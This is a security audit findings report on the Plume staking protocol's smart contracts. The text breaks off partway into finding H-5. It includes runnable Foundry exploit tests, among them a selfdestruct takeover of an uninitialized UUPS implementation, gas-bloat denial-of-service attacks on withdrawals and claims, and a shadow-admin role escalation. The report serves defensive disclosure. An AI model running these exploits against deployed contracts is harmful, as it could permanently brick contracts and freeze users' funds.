# contracts/plume - Findings Report
## Commit hash: fe67a98fa4344520c5ff2ac9293f5d9601963983

## Protocol Overview 

**Plume Protocol** brings delegated staking, multi-token rewards and gamified engagement to the Plume Network through a modular, upgrade-ready architecture.

• **Diamond-based Staking (PlumeStaking)** – A single proxy exposes staking logic split across facets: Staking (stake/unstake/restake/withdraw), Rewards (multi-asset emission + treasury payouts), Validator (registration, commission, slashing), Management (system params) and AccessControl (role hierarchy).  Users delegate PLUME to active validators, accrue rewards per validator/token via checkpointed rates, and withdraw after a cooldown. Validators earn configurable commission capped system-wide and can be slashed by unanimous peer vote.

• **Isolated Treasury** – Rewards are custodied in an upgradeable UUPS treasury contract; only the diamond can instruct transfers, keeping staking state and funds separate.

• **Upgradeable Everything** – All logic (diamond facets, ERC20 PLUME token, treasury, Spin, Raffle) sits behind ERC1967 or UUPS proxies, letting governors patch modules without migrating state.

• **Spin & Raffle Gamification** – A daily Spin contract (UUPS) sells spins for PLUME; Supra VRF randomness decides jackpots, tokens, raffle tickets or points, with streak bonuses. Tickets feed into an upgradeable multi-winner Raffle where prizes are drawn via VRF.

Together, Plume delivers secure, flexible staking economics plus community engagement mechanics, all guarded by robust role-based access and on-chain upgrade paths.
## Critical Risk Findings
[C-1]. Upgradeability Initializer Safety issue in PlumeStakingRewardTreasury::initialize
## High Risk Findings
[H-1]. DOS issue in ValidatorFacet::_cleanupExpiredVotes
[H-2]. DOS issue in StakingFacet::_processMaturedCooldowns
[H-3]. Access Control issue in AccessControlFacet::initializeAccessControl
[H-4]. DOS issue in RewardsFacet::claim
[H-5]. DOS issue in ValidatorFacet::voteToSlashValidator, slashValidator
[H-6]. Timestamp Dependent Logic issue in Spin::determineReward
[H-7]. DOS issue in StakingFacet::withdraw
[H-8]. DOS issue in ValidatorFacet::voteToSlashValidator
## Medium Risk Findings
[M-1]. DOS issue in RewardsFacet::addRewardToken
[M-2]. DOS issue in RewardsFacet::setRewardRates, removeRewardToken
[M-3]. Upgradeability Initializer Safety issue in Raffle::initialize
[M-4]. Access Control issue in ManagementFacet::adminClearValidatorRecord
[M-5]. DOS issue in RewardsFacet::setRewardRates
[M-6]. DOS issue in Spin::cancelPendingSpin
[M-7]. DOS issue in ManagementFacet::setMaxAllowedValidatorCommission
## Low Risk Findings
[L-1]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::_validateValidatorPercentage
[L-2]. Frontrun/Backrun/Sandwhich MEV issue in Spin::startSpin
[L-3]. DOS issue in Raffle::getPrizeDetails
[L-4]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::stake
[L-5]. Zero Code issue in RewardsFacet::addRewardToken
[L-6]. Upgradeability Initializer Safety issue in Plume::NA
[L-7]. Frontrun/Backrun/Sandwhich MEV issue in Spin::handleRandomness
[L-8]. DOS issue in RewardsFacet::claimAll, claim(address)
[L-9]. Timestamp Dependent Logic issue in Raffle::claimPrize
[L-10]. Randomness issue in Spin::startSpin
[L-11]. Unexpected Eth issue in ManagementFacet::adminWithdraw
[L-12]. Access Control issue in Plume::burn
[L-13]. Event Consistency issue in ManagementFacet::removeHistoricalRewardToken
[L-14]. Integer Overflow issue in RewardsFacet::_finalizeRewardClaim
[L-15]. DOS issue in ManagementFacet::pruneCommissionCheckpoints
[L-16]. DOS issue in Spin::handleRandomness
[L-17]. Zero Code issue in RewardsFacet::setTreasury
[L-18]. DOS issue in StakingFacet::withdraw
[L-19]. DOS issue in ManagementFacet::setMaxAllowedValidatorCommission
[L-20]. DOS issue in RewardsFacet::claimAll
## Info Risk Findings
[I-1]. Randomness issue in Spin::determineReward
[I-2]. Reentrancy issue in RewardsFacet::claim


### Number of Findings
- C: 1
- H: 8
- M: 7
- L: 20
- I: 2



# Critical Risk Findings

## [C-1]. Upgradeability Initializer Safety issue in PlumeStakingRewardTreasury::initialize

## Description
The UUPS (Universal Upgradeable Proxy Standard) implementation contracts (`PlumeStakingRewardTreasury`, `Plume`, `Spin`, `Raffle`) are missing a constructor that calls `_disableInitializers()`. This oversight allows any attacker to call the public `initialize` function on the logic contract's address. By initializing the logic contract, an attacker can gain administrative control (e.g., `ADMIN_ROLE` or `UPGRADER_ROLE`) over it. With this control, the attacker can then invoke the `upgradeToAndCall` function to point the implementation to a malicious contract that contains a `selfdestruct` opcode. Executing this will destroy the implementation contract, permanently bricking all proxy contracts that delegate calls to it.

## Impact
Permanent destruction of the contract's logic, leading to a total and irreversible loss of functionality for the Treasury, Plume token, Spin, and Raffle systems. All assets managed by or dependent on these contracts would be permanently frozen or lost.

## Proof of Concept
1. The logic contract (not the proxy) is deployed on–chain at address `IMPL` and has **not** been initialized.
2. Attacker calls `IMPL.initialize(attacker, attacker)`.  Because the storage lives inside `IMPL`, the attacker is now `DEFAULT_ADMIN_ROLE`, `ADMIN_ROLE` and `UPGRADER_ROLE` **for that contract**.
3. Attacker deploys a helper contract `Destroyer` that contains only a `destroy()` function with `selfdestruct`.
4. Attacker executes
   ```solidity
   IMPL.upgradeToAndCall(
       address(destroyer),
       abi.encodeWithSelector(Destroyer.destroy.selector)
   );
   ```
   • `upgradeToAndCall` first stores `address(destroyer)` in the ERC-1967 implementation slot **inside IMPL’s own storage**.
   • It then `delegatecall`s into `Destroyer.destroy()` **in the context of IMPL**.
5. `selfdestruct` therefore runs **from IMPL’s address**, wiping its runtime-code (`EXTCODESIZE(IMPL) == 0`).
6. All proxies that delegate-call to `IMPL` are now bricked – every external call reverts because there is no code at the target.

## Proof of Code
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStakingRewardTreasury} from "src/PlumeStakingRewardTreasury.sol";
import {PlumeStakingRewardTreasuryProxy} from "src/proxy/PlumeStakingRewardTreasuryProxy.sol";

contract Destroyer {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}

contract ImplementationSelfDestructTest is Test {
    PlumeStakingRewardTreasury impl;
    PlumeStakingRewardTreasuryProxy proxy;

    address attacker = address(0xBEEF);
    address admin    = address(0xABCD);
    address distributor = address(0x1234);

    function setUp() public {
        // deploy un-initialized implementation
        impl = new PlumeStakingRewardTreasury();

        // deploy a proxy that *is* correctly initialised (not the attack target)
        bytes memory data = abi.encodeWithSelector(
            PlumeStakingRewardTreasury.initialize.selector,
            admin,
            distributor
        );
        proxy = new PlumeStakingRewardTreasuryProxy(address(impl), data);
    }

    function test_logic_can_be_destroyed() public {
        // attacker initializes the logic contract itself
        vm.prank(attacker);
        impl.initialize(attacker, attacker);

        // deploy destroyer helper
        Destroyer destroyer = new Destroyer();

        // attacker upgrades logic to destroyer and immediately self-destructs
        vm.prank(attacker);
        impl.upgradeToAndCall(
            address(destroyer),
            abi.encodeWithSelector(Destroyer.destroy.selector)
        );

        // implementation byte-code is now gone
        assertEq(address(impl).code.length, 0, "implementation should be destroyed");

        // any call through the proxy must revert because delegatecall has no code to execute
        vm.expectRevert();
        PlumeStakingRewardTreasury(address(proxy)).isRewardToken(address(0));
    }
}

## Suggested Mitigation
To prevent the takeover of implementation contracts, add a constructor to each UUPS upgradeable contract (`PlumeStakingRewardTreasury`, `Plume`, `Spin`, `Raffle`) that calls `_disableInitializers()`. This function, provided by OpenZeppelin's `Initializable` contract, permanently locks the `initialize` function on the contract it's called on, ensuring it can only be successfully invoked on the proxy.

```solidity
// Add this constructor to PlumeStakingRewardTreasury.sol, Plume.sol, Spin.sol, and Raffle.sol

constructor() {
    _disableInitializers();
}
```



# High Risk Findings

## [H-1]. DOS issue in ValidatorFacet::_cleanupExpiredVotes

## Description
Several critical functions within the `ValidatorFacet`, particularly those related to slashing (`voteToSlashValidator`, `slashValidator`), rely on internal helper functions that iterate over the entire list of all validators (`$.validatorIds`). Specifically, `_cleanupExpiredVotes` and `_countActiveValidators` use unbounded loops. As the number of validators in the system increases, the gas cost of these loops grows linearly. This creates a scalability issue that becomes a Denial of Service (DoS) vulnerability, as the transaction gas cost can exceed the block gas limit, making it impossible to execute these functions. Consequently, the entire slashing mechanism, a cornerstone of the protocol's security, can be rendered inoperable, preventing the punishment of malicious validators.

## Impact
If the validator set grows to a few thousand entries, every call to voteToSlashValidator, slashValidator or the public cleanupExpiredVotes will execute an O(n) loop over the full validatorIds array.  At that scale the gas required will exceed the block gas limit and the transaction will run out of gas, permanently disabling the slashing mechanism and breaking an essential security assumption of the protocol.  No funds are directly stolen, but malicious validators can never be punished once the system reaches that size, undermining economic security.

## Proof of Concept
1. Deploy PlumeStaking and grant VALIDATOR_ROLE to the test contract.
2. Add 2 400 validators so that validatorIds.length == 2 400 (below EVM-level arrays are still feasible in a unit-test).  validatorId 1 will be the malicious validator, validatorId 2 the voter.
3. Measure gas used by a single call to voteToSlashValidator after every 300 extra validators are added.
4. Observe that gas grows roughly linearly (~22k-24k per extra 300 ids).  Extrapolated, 10 000 validators would consume > 20 M gas – above main-net limits – and the call will fail, disabling slashing.

The test below prints the gas usage table so the trend is visible without relying on an actual out-of-gas revert.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStaking} from "src/PlumeStaking.sol";
import {ValidatorFacet} from "src/facets/ValidatorFacet.sol";
import {AccessControlFacet} from "src/facets/AccessControlFacet.sol";
import {PlumeRoles} from "src/lib/PlumeRoles.sol";
import {IDiamondCut} from "@solidstate/contracts/proxy/diamond/IDiamondCut.sol";

contract CleanupGasTest is Test {
    PlumeStaking staking;
    ValidatorFacet vf;
    AccessControlFacet ac;

    address owner = address(0xA11CE);

    function setUp() public {
        vm.startPrank(owner);
        staking = new PlumeStaking();

        // add only the validator facet selectors we use
        ValidatorFacet facetImpl = new ValidatorFacet();
        bytes4[] memory sels = new bytes4[](4);
        sels[0] = facetImpl.addValidator.selector;
        sels[1] = facetImpl.voteToSlashValidator.selector;
        sels[2] = facetImpl.getActiveValidatorCount.selector;
        sels[3] = facetImpl.cleanupExpiredVotes.selector;
        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](1);
        cuts[0] = IDiamondCut.FacetCut(address(facetImpl), IDiamondCut.FacetCutAction.ADD, sels);
        IDiamondCut(address(staking)).diamondCut(cuts, address(0), "");
        vf = ValidatorFacet(address(staking));

        // access control facet (only initialize + grantRole)
        AccessControlFacet acImpl = new AccessControlFacet();
        bytes4[] memory acSels = new bytes4[](3);
        acSels[0] = acImpl.grantRole.selector;
        acSels[1] = acImpl.initializeAccessControl.selector;
        acSels[2] = acImpl.hasRole.selector;
        cuts[0] = IDiamondCut.FacetCut(address(acImpl), IDiamondCut.FacetCutAction.ADD, acSels);
        IDiamondCut(address(staking)).diamondCut(cuts, address(0), "");
        ac = AccessControlFacet(address(staking));

        staking.initializePlume(owner, 1e18, 7 days, 3 days, 5e17);
        ac.initializeAccessControl();
        ac.grantRole(PlumeRoles.VALIDATOR_ROLE, address(this));
        vm.stopPrank();
    }

    function _addMany(uint16 startId, uint16 count) internal {
        for (uint16 i = 0; i < count; i++) {
            uint16 id = startId + i;
            vf.addValidator(id, 0.1e18, vm.addr(id), vm.addr(id), "", "", address(0), 1e27);
        }
    }

    function testGasGrowth() public {
        // malicious = 1, voter = 2
        _addMany(1, 2);
        uint256 targetExp = block.timestamp + 1 days;
        uint256 initialGas = gasleft();
        vf.voteToSlashValidator(1, targetExp);
        uint256 baseCost = initialGas - gasleft();
        emit log_named_uint("gas with 2 validators", baseCost);

        for (uint256 k = 0; k < 7; k++) {
            _addMany(uint16(3 + k * 300), 300); // +300 each iteration
            uint256 g0 = gasleft();
            vf.voteToSlashValidator(1, targetExp + k + 1);
            uint256 diff = g0 - gasleft();
            emit log_named_uint(string(abi.encodePacked("gas with ", Strings.toString(vf.getActiveValidatorCount()), " validators")), diff);
        }
        // The emitted log clearly shows linear growth; no assert needed.
    }
}

## Suggested Mitigation
Short term: add an early-return guard at the top of _cleanupExpiredVotes and _countActiveValidators:
    if ($.validatorIds.length > 1500) revert TooManyValidators();

Long term (recommended):
1.  Maintain a uint256 activeValidatorCount that is incremented/decremented on status or slash events; use this counter instead of walking the whole array.
2.  Replace slashingVotes mapping by a struct that also stores an array of current voters so that _cleanupExpiredVotes iterates over that much smaller set instead of all validators.
3.  Consider emitting an event when vote cleanup removes an expired vote so that off-chain indexers can keep a canonical voter list.

## [H-2]. DOS issue in StakingFacet::_processMaturedCooldowns

## Description
Several core functions in `StakingFacet` iterate over the `userValidators` array, which stores all validators a user has ever staked with. The size of this array is unbounded. An attacker can exploit this by calling `stakeOnBehalf` to stake a minimal amount to a large number of validators on behalf of a victim. When the victim later tries to call functions like `withdraw()`, `restake()`, or `restakeRewards()`, the internal calls to `_processMaturedCooldowns` or `_calculateAndClaimAllRewardsWithCleanup` will loop through this large array. This will consume an excessive amount of gas, likely causing the transaction to revert by exceeding the block gas limit. This effectively creates a Denial of Service, preventing the victim from managing their funds and potentially locking them permanently if the gas cost can never be met within the block limit.

## Impact
A malicious actor can prevent a victim from using essential contract functions like `withdraw()`, `restake()`, and `restakeRewards()`. This can lead to a permanent freeze of the victim's funds if they cannot execute these functions without hitting the block gas limit. The attack cost is low, as it only requires staking the minimum amount across many validators on behalf of the victim.

## Proof of Concept
The denial-of-service hinges on the fact that the functions withdraw(), restake() and restakeRewards() must finish iterating over *all* entries in `userValidators`. Because the array can be grown without bound through repeated `stakeOnBehalf` calls, an attacker can bloat it until the cost of those iterations alone exceeds the block-gas-limit.

Steps:
1. Assume the minStakeAmount is 1 wei (or the real minimum).
2. There are initially N active validators (the attacker can create extra ones if they have the VALIDATOR_ROLE, otherwise they use the existing set).  
3. For each new or existing validator `vid`, the attacker calls `stakeOnBehalf{value:minStakeAmount}(vid, victim)`.
   • This pushes `vid` into `userValidators[victim]` and cannot be undone later.  
4. After the list has been enlarged to ≈ 10 000 entries, any call that internally executes `_processMaturedCooldowns(victim)` or `_calculateAndClaimAllRewardsWithCleanup(victim, …)` performs a `for`-loop over those 10 000 indices and quickly runs out of gas (> 30 M).
5. Because the loop is executed at the very beginning of withdraw/restake/claim, the victim can no longer reach the rest of the function and their funds remain permanently locked, unless the contract itself is upgraded.

NB: the attack cost is O(validatorCount × minStakeAmount) and does **not** require any privileged role.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStakingDiamond} from "test/PlumeStakingDiamond.t.sol";
import {StakingFacet}           from "src/facets/StakingFacet.sol";

contract DosMaturedCooldownTest is PlumeStakingDiamond {
    StakingFacet internal facet;
    address internal attacker = makeAddr("attacker");
    address internal victim   = makeAddr("victim");

    uint16 constant BLOATED = 12000; // enough to exceed 30M gas for loop

    function setUp() public override {
        super.setUp();
        facet = stakingFacet;
        // fund both parties
        vm.deal(attacker, 1 ether);
        vm.deal(victim,   100 ether);
    }

    function test_withdrawFailsWithLimitedGas() public {
        // 1) create many validators
        for (uint16 i = 1; i <= BLOATED; i++) {
            _addValidator(i, address(this));
        }

        // 2) attacker bloats victim array
        vm.startPrank(attacker);
        for (uint16 i = 1; i <= BLOATED; i++) {
            facet.stakeOnBehalf{value: 1}(i, victim); // 1 wei each
        }
        vm.stopPrank();

        // 3) victim performs a normal stake / unstake so they have withdrawable funds
        uint16 legitValidator = BLOATED + 1;
        _addValidator(legitValidator, address(this));
        vm.prank(victim);
        facet.stake{value: 10 ether}(legitValidator);
        vm.prank(victim);
        facet.unstake(legitValidator, 10 ether);

        // fast-forward cooldown
        uint256 cd = managementFacet.getCooldownInterval();
        vm.warp(block.timestamp + cd + 1);

        // 4) Victim tries to withdraw but we deliberately pass a limited gas stipend
        bytes memory callData = abi.encodeWithSignature("withdraw()");
        // give only 5M gas which is well below block limit but above normal tx usage
        (bool ok,) = address(facet).call{gas: 5_000_000}(callData);
        assertFalse(ok, "withdraw unexpectedly succeeded – array not big enough or logic changed");
    }
}

## Suggested Mitigation
The unbounded loops should be replaced with a paginated approach. Instead of processing all of a user's associated validators in one transaction, allow the user to process them in batches.

For example, `_processMaturedCooldowns` could be exposed as a public function `processMyMaturedCooldowns(uint256 cursor, uint256 limit)` that the user calls repeatedly to process their cooldowns. The main `withdraw` function would then require that all matured cooldowns have been processed before allowing the withdrawal of the parked balance.

Example of a paginated function signature:

```solidity
function processMaturedCooldowns(address user, uint256 cursor, uint256 limit) internal returns (uint256 newCursor) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    uint256 amountMovedToParked = 0;
    uint16[] memory userAssociatedValidators = $.userValidators[user];
    uint256 len = userAssociatedValidators.length;

    uint256 i = cursor;
    while (i < len && i < cursor + limit) {
        // ... existing logic for one validator ...
        i++;
    }

    if (amountMovedToParked > 0) {
        _updateParkedAmounts(user, amountMovedToParked);
    }
    
    return i >= len ? 0 : i; // Return 0 when done, otherwise the next cursor
}
```

The public `withdraw` function would then be split into two steps: `processCooldowns()` (which the user calls until it's done) and a final `withdrawParked()`.

## [H-3]. Access Control issue in AccessControlFacet::initializeAccessControl

## Description
The `initializeAccessControl` function correctly sets up most roles to be administered by the `ADMIN_ROLE`. However, it fails to set an admin for the `DEFAULT_ADMIN_ROLE` (`0x00`). The function grants `DEFAULT_ADMIN_ROLE` to the initializer (`msg.sender`), and because no admin is set for this role, it defaults to being its own admin. This creates a "shadow admin" that is not controlled by the main `ADMIN_ROLE`. An initializer who has their `ADMIN_ROLE` revoked would still retain `DEFAULT_ADMIN_ROLE` and could use it to gain unauthorized access, especially if new roles are added in future upgrades without an explicitly set admin, as they would default to being managed by `DEFAULT_ADMIN_ROLE`.

Vulnerable Code Snippet:
```solidity
// contracts/plume/src/facets/AccessControlFacet.sol:41-63
function initializeAccessControl() external {
    // ...
    _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);

    _grantRole(ADMIN_ROLE, msg.sender);

    _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
    _setRoleAdmin(TIMELOCK_ROLE, ADMIN_ROLE);
    _setRoleAdmin(UPGRADER_ROLE, ADMIN_ROLE);
    _setRoleAdmin(VALIDATOR_ROLE, ADMIN_ROLE);
    _setRoleAdmin(REWARD_MANAGER_ROLE, ADMIN_ROLE);

    // Missing: _setRoleAdmin(DEFAULT_ADMIN_ROLE, ADMIN_ROLE);
    // ...
}
```

## Impact
This vulnerability undermines the entire access control hierarchy of the protocol. It creates a permanent, hidden administrative power that cannot be revoked by the main `ADMIN_ROLE`. A malicious or compromised initializer account could exploit this to grant themselves or others powerful roles during future upgrades, potentially leading to a full protocol takeover, theft of funds, or other malicious actions. It breaks the security assumption that `ADMIN_ROLE` is the ultimate authority.

## Proof of Concept
1. The Deployer calls `initializeAccessControl()`, receiving both `ADMIN_ROLE` and `DEFAULT_ADMIN_ROLE`.
2. For security, the Deployer grants `ADMIN_ROLE` to a multisig (`NewAdmin`) and then `NewAdmin` revokes `ADMIN_ROLE` from the Deployer's EOA.
3. The Deployer's EOA no longer has `ADMIN_ROLE`, but it retains the irremovable `DEFAULT_ADMIN_ROLE` because only an account with `DEFAULT_ADMIN_ROLE` can revoke it.
4. Later, the protocol is upgraded with a new facet containing a `CRITICAL_ROLE`. If the developers forget to set an admin for this role in the upgrade, its admin defaults to `DEFAULT_ADMIN_ROLE`.
5. The Deployer's (potentially compromised) EOA can now call `grantRole(CRITICAL_ROLE, attacker_address)` because it holds `DEFAULT_ADMIN_ROLE`.
6. The attacker gains critical privileges, completely bypassing the `NewAdmin` multisig's authority.

## Proof of Code
// File: test/AccessControlShadowAdmin.t.sol
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

// --- Minimal mocks reused from the original PoC ---
library AccessControlStorage {
    struct RoleData { mapping(address => bool) members; bytes32 adminRole; }
    struct Layout { mapping(bytes32 => RoleData) roles; }
    bytes32 constant STORAGE_SLOT = keccak256("solidstate.contracts.storage.AccessControl");
    function layout() internal pure returns (Layout storage l) {
        bytes32 slot = STORAGE_SLOT;
        assembly { l.slot := slot }
    }
}

library PlumeStakingStorage {
    bytes32 constant STORAGE_SLOT = keccak256("plume.staking.storage");
    struct Layout { bool accessControlFacetInitialized; }
    function layout() internal pure returns (Layout storage l) {
        bytes32 slot = STORAGE_SLOT;
        assembly { l.slot := slot }
    }
}

library PlumeRoles {
    bytes32 public constant ADMIN_ROLE         = keccak256("ADMIN_ROLE");
    bytes32 public constant UPGRADER_ROLE      = keccak256("UPGRADER_ROLE");
    bytes32 public constant VALIDATOR_ROLE     = keccak256("VALIDATOR_ROLE");
    bytes32 public constant REWARD_MANAGER_ROLE= keccak256("REWARD_MANAGER_ROLE");
    bytes32 public constant TIMELOCK_ROLE      = keccak256("TIMELOCK_ROLE");
}

abstract contract AccessControlInternal {
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);
    function _hasRole(bytes32 role, address account) internal view returns (bool) {
        return AccessControlStorage.layout().roles[role].members[account];
    }
    function _getRoleAdmin(bytes32 role) internal view returns (bytes32) {
        return AccessControlStorage.layout().roles[role].adminRole;
    }
    function _grantRole(bytes32 role, address account) internal {
        if (!_hasRole(role, account)) {
            AccessControlStorage.layout().roles[role].members[account] = true;
            emit RoleGranted(role, account, msg.sender);
        }
    }
    function _revokeRole(bytes32 role, address account) internal {
        if (_hasRole(role, account)) {
            AccessControlStorage.layout().roles[role].members[account] = false;
            emit RoleRevoked(role, account, msg.sender);
        }
    }
    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal {
        AccessControlStorage.layout().roles[role].adminRole = adminRole;
    }
    modifier onlyRole(bytes32 role) {
        require(_hasRole(role, msg.sender), "Only role");
        _;
    }
}

contract AccessControlFacet is AccessControlInternal {
    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
    bytes32 public constant ADMIN_ROLE         = PlumeRoles.ADMIN_ROLE;
    bytes32 public constant UPGRADER_ROLE      = PlumeRoles.UPGRADER_ROLE;
    bytes32 public constant VALIDATOR_ROLE     = PlumeRoles.VALIDATOR_ROLE;
    bytes32 public constant REWARD_MANAGER_ROLE= PlumeRoles.REWARD_MANAGER_ROLE;
    bytes32 public constant TIMELOCK_ROLE      = PlumeRoles.TIMELOCK_ROLE;

    function initializeAccessControl() external {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        require(!$.accessControlFacetInitialized, "ACF: init");

        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(ADMIN_ROLE,   msg.sender);

        _setRoleAdmin(ADMIN_ROLE,  ADMIN_ROLE);
        _setRoleAdmin(TIMELOCK_ROLE, ADMIN_ROLE);
        _setRoleAdmin(UPGRADER_ROLE, ADMIN_ROLE);
        _setRoleAdmin(VALIDATOR_ROLE, ADMIN_ROLE);
        _setRoleAdmin(REWARD_MANAGER_ROLE, ADMIN_ROLE);

        $.accessControlFacetInitialized = true;
    }

    function hasRole(bytes32 r, address a) external view returns (bool) { return _hasRole(r,a); }
    function getRoleAdmin(bytes32 r) external view returns (bytes32) { return _getRoleAdmin(r); }
    function grantRole(bytes32 r,address a) external onlyRole(_getRoleAdmin(r)) { _grantRole(r,a); }
    function revokeRole(bytes32 r,address a) external onlyRole(_getRoleAdmin(r)) { _revokeRole(r,a); }
}

// --- Foundry test proving the shadow-admin problem ---
contract AccessControlShadowAdminTest is Test {
    AccessControlFacet ac;
    address deployer = makeAddr("deployer");
    address newAdmin = makeAddr("newAdmin");
    address attacker = makeAddr("attacker");

    bytes32 constant DEFAULT_ADMIN_ROLE = 0x00;
    bytes32 constant ADMIN_ROLE = PlumeRoles.ADMIN_ROLE;

    function setUp() public {
        ac = new AccessControlFacet();
        vm.prank(deployer);
        ac.initializeAccessControl();
    }

    function testShadowAdminCanBypassGovernance() public {
        // Deployer starts with both roles
        assertTrue(ac.hasRole(DEFAULT_ADMIN_ROLE, deployer));
        assertTrue(ac.hasRole(ADMIN_ROLE,         deployer));

        // Hand ADMIN_ROLE to multisig and revoke it from deployer
        vm.prank(deployer);
        ac.grantRole(ADMIN_ROLE, newAdmin);
        vm.prank(newAdmin);
        ac.revokeRole(ADMIN_ROLE, deployer);
        assertFalse(ac.hasRole(ADMIN_ROLE, deployer));

        // Any brand-new role’s admin defaults to DEFAULT_ADMIN_ROLE
        bytes32 superSensitiveRole = keccak256("SUPER_SENSITIVE_ROLE");
        assertEq(ac.getRoleAdmin(superSensitiveRole), DEFAULT_ADMIN_ROLE);

        // Deployer (still DEFAULT_ADMIN_ROLE) can grant it to attacker
        vm.prank(deployer);
        ac.grantRole(superSensitiveRole, attacker);
        assertTrue(ac.hasRole(superSensitiveRole, attacker));
    }
}

## Suggested Mitigation
The `DEFAULT_ADMIN_ROLE` should be subordinated to the `ADMIN_ROLE` to create a clear and single chain of authority. Add the following line to the `initializeAccessControl` function.
```solidity
// contracts/plume/src/facets/AccessControlFacet.sol
function initializeAccessControl() external {
    // ...
    _setRoleAdmin(VALIDATOR_ROLE, ADMIN_ROLE);
    _setRoleAdmin(REWARD_MANAGER_ROLE, ADMIN_ROLE);
    
    // Add this line
    _setRoleAdmin(DEFAULT_ADMIN_ROLE, ADMIN_ROLE);

    // Grant initial roles to the caller
    // ...
}
```
This ensures that only an account with `ADMIN_ROLE` can grant or revoke `DEFAULT_ADMIN_ROLE`, centralizing administrative control.

## [H-4]. DOS issue in RewardsFacet::claim

## Description
The reward calculation functions, specifically `PlumeRewardLogic._calculateRewardsCore` called via `getDistinctTimestamps`, iterate through unbounded checkpoint arrays (`validatorRewardRateCheckpoints`, `validatorCommissionCheckpoints`). These arrays grow each time an administrator updates reward or commission rates. There is no automatic pruning mechanism. If a validator accumulates a large number of checkpoints over time, the gas cost for a user's `claim` transaction can exceed the block gas limit. This would cause the transaction to fail, rendering rewards permanently unclaimable for all users staked to that validator and leading to a permanent loss of funds.

## Impact
Users' funds can be permanently frozen. If the checkpoint arrays for a validator grow too large, no user staked to that validator will be able to claim their rewards, as the transaction will always run out of gas. This constitutes a permanent loss of funds for affected users.

## Proof of Concept
1. An administrator with the `REWARD_MANAGER_ROLE` calls `setRewardRates` frequently over a long period for a specific validator. This can also happen with `setValidatorCommission` in `ValidatorFacet`.
2. Each call creates a new entry in the `validatorRewardRateCheckpoints` and/or `validatorCommissionCheckpoints` arrays for that validator.
3. A user who is staked to this validator attempts to call `RewardsFacet.claim(rewardTokenAddress)`.
4. The `claim` function internally calls the reward calculation logic, which iterates through both checkpoint arrays to determine rewards for different time segments.
5. The iteration over the large checkpoint arrays consumes an excessive amount of gas, causing the transaction to revert due to an out-of-gas error.
6. The user is unable to claim their rewards. The funds are effectively locked.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStakingDiamond} from "test/PlumeStakingDiamond.t.sol";
import {PlumeRoles} from "src/lib/PlumeRoles.sol";

contract RewardsFacetGasGrowthTest is PlumeStakingDiamond {
    address internal constant REWARD_MANAGER = address(0xFACE1);
    address internal constant VALIDATOR_ADMIN = address(0xFACE2);

    function setUp() public override {
        super.setUp();
        accessControlFacet.grantRole(PlumeRoles.REWARD_MANAGER_ROLE, REWARD_MANAGER);
        accessControlFacet.grantRole(PlumeRoles.VALIDATOR_ROLE, DEPLOYER);

        // one validator
        validatorFacet.addValidator(1, 0, VALIDATOR_ADMIN, VALIDATOR_ADMIN, address(0), address(0), address(0), 1_000_000e18);

        // reward token
        vm.prank(REWARD_MANAGER);
        rewardsFacet.addRewardToken(address(pusd), 1e16, 1e18);

        // user stakes
        deal(address(plume), user, 1000e18);
        vm.startPrank(user);
        plume.approve(address(stakingFacet), 1000e18);
        stakingFacet.stake(1, 1000e18);
        vm.stopPrank();
    }

    function _createRewardRateCheckpoints(uint256 count) internal {
        address[] memory tokens = new address[](1);
        tokens[0] = address(pusd);
        uint256[] memory rates = new uint256[](1);

        vm.startPrank(REWARD_MANAGER);
        for (uint256 i; i < count; ++i) {
            rates[0] = 1e16 + i;
            rewardsFacet.setRewardRates(tokens, rates);
            vm.warp(block.timestamp + 1); // make each checkpoint unique in time
        }
        vm.stopPrank();
    }

    function test_gas_grows_with_checkpoint_count() public {
        _createRewardRateCheckpoints(20); // modest baseline
        vm.warp(block.timestamp + 1 days);

        uint256 gasStart = gasleft();
        vm.prank(user);
        rewardsFacet.claim(address(pusd));
        uint256 gasFirstClaim = gasStart - gasleft();

        // add a lot more checkpoints
        _createRewardRateCheckpoints(330); // total 350 checkpoints
        vm.warp(block.timestamp + 1 days);

        gasStart = gasleft();
        vm.prank(user);
        rewardsFacet.claim(address(pusd));
        uint256 gasSecondClaim = gasStart - gasleft();

        emit log_named_uint("Gas with 20 checkpoints", gasFirstClaim);
        emit log_named_uint("Gas with 350 checkpoints", gasSecondClaim);

        assertTrue(gasSecondClaim > gasFirstClaim + 50_000, "Gas should increase noticeably with more checkpoints");
    }
}


## Suggested Mitigation
The reward calculation logic should be refactored to avoid iterating over the entire history of checkpoints in a single transaction. Instead of building a `distinctTimestamps` array in memory by merging two potentially large checkpoint arrays, the calculation can be performed segment by segment.

A more robust long-term solution would be to redesign the checkpointing system to cap the number of checkpoints processed in a single claim transaction, allowing users to claim rewards in partial batches if necessary, or by implementing a mechanism to periodically roll up old checkpoints into a single cumulative value, thus bounding the array length.

## [H-5]. DOS issue in ValidatorFacet::voteToSlashValidator, slashValidator

## Description
Several critical functions within the `ValidatorFacet` iterate over the `$.validatorIds` array, which contains the ID of every validator ever added to the system. There is no mechanism to remove validators from this array, even after they are slashed or become permanently inactive. As the number of validators increases over time (either through organic growth or a malicious actor with `VALIDATOR_ROLE` adding many validators), the gas cost of these loops will grow linearly. If the number of validators becomes sufficiently large, the gas cost to execute these loops can exceed the block gas limit, causing any transaction that calls them to fail.

This affects the following critical security functions:
